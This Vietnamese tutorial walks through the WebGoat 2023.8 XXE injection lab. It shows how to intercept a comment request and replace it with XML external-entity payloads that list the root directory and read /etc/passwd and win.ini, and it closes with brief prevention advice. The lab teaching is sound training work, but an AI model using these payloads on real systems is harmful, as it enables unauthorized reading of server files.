---
title: 1.04 | XXE
slug: XXE-04
description: Bài viết này sẽ hướng dẫn cách tấn công XXE trên WebGoat 2023.8
image: https://tiennhm.github.io/img/docs/database.jpg
sidebar_position: 1
# sidebar_class_name: hidden
tags: 
    - web-security
    - webgoat
    - security-misconfiguration
    - xxe
    - webgoat-2023.8
keywords: [web-security, webgoat, security-misconfiguration, xxe, webgoat-2023.8]
enableComments: true # for Gisqus comments, set to true
draft: false # set to true to hide this post from the site
---

> 🛠 **XXE Injection - Thử nghiệm khai thác**

## 📌 **1. Mục tiêu của bài thực hành**
- Gửi bình luận trên ảnh và thử thực hiện **XXE Injection**.
- Mục tiêu: **liệt kê thư mục gốc** (`/` trên Linux, `C:\` trên Windows).
- Dùng **Burp Suite, ZAP Proxy** hoặc **DevTools** để phân tích request.


## 🔥 **2. Cách thực hiện**
### **📌 Bước 1: Gửi bình luận bình thường**  
Trước tiên, thử gửi một bình luận bình thường để xem request được gửi như thế nào.

Ví dụ:
```xml
<comment>
  <text>I am a cat</text>
</comment>
```
🔍 **Phân tích format XML của request này.**  


### **📌 Bước 2: Dùng Burp/ZAP để chặn request**
1. **Mở Burp Suite hoặc ZAP**.
2. **Bật Intercept Mode (Burp) hoặc Breakpoint (ZAP)**.
3. **Gửi một bình luận**.
4. **Phân tích request được gửi đi**.


### **📌 Bước 3: Thay đổi request để thực hiện XXE Injection**  
👉 Thay đổi phần `text` thành:
```xml
<?xml version="1.0"?>
<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]>
<comment>
  <text>&xxe;</text>
</comment>
```
📌 **Giải thích:**  
- `<!DOCTYPE comment [...]>`: Khai báo **DOCTYPE** để có thể sử dụng `ENTITY`.
- `<!ENTITY xxe SYSTEM "file:///">`: Định nghĩa một entity để đọc thư mục gốc `/`.
- `<text>&xxe;</text>`: Chèn entity vào nội dung bình luận.


## 🔎 **3. Kiểm tra phản hồi của server**
- Nếu server trả về danh sách thư mục (`bin, etc, home, root...`), **XXE Injection thành công**.
- Nếu không có phản hồi hoặc có lỗi, có thể server đã **vô hiệu hóa DTD** hoặc **bảo vệ XXE**.


## 🚨 **4. Phòng chống XXE**
✅ **Vô hiệu hóa DOCTYPE trong XML parser**  
✅ **Không cho phép đọc external entities (`SYSTEM "file:///"`)**  
✅ **Sử dụng JSON thay vì XML nếu có thể**  
✅ **Dùng WAF để phát hiện payload chứa `<!ENTITY`**  


## 📢 **Bạn có thể thử nghiệm với các file khác:**
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- Linux -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">  <!-- Windows -->
```
